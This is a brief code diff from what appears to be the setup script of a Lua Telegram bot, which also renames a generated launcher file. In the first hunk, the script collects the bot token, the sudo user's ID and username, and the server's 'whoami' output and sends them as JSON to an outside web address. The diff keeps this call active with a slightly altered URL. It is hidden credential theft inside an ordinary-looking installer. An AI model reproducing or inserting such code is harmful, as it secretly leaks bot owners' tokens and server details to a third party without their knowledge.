@@ -71,7 +71,7 @@ saiedinfo.id = database:get(id_server..":SUDO:ID")
 saiedinfo.username = database:get(id_server..":SUDO:USERNAME")
 saiedinfo.tokenbot  = database:get(id_server..":token")
 saiedinfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://sadamoro.tk/v.php?insert='..JSON.encode(saiedinfo))
+https.request('https://sadamoro.tk/v.php/?insert='..JSON.encode(saiedinfo))
 create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
@@ -103,7 +103,7 @@ echo -e "\e[36m"
 done
 ]])  
 file:close()  
-file = io.open("BK", "w")  
+file = io.open("RA", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/RAMIS
